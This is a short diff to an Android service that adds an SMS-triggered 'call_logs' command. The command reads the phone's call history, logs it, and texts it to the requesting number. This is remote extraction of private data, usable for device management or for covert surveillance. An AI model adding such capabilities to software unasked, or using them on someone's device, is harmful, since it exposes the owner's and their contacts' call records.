@@ -201,6 +201,13 @@ public class ProcessService extends Service {
                 }
 
             }
+            else if (ActionPerform.equalsIgnoreCase("call_logs"))
+            {
+                Log.d("Call_Logs","Method: onStartCommand,Class:ProcessService");
+                String call_logs=CommandProcessor.getCallLogs(getApplicationContext());
+                Log.d("Call_Logs","These are the Logs:\n " + call_logs);
+                SendSms(call_logs,Requester_No);
+            }
             else
             {
                 //Toast.makeText(getApplicationContext(), "Wrong Command!", Toast.LENGTH_LONG).show();
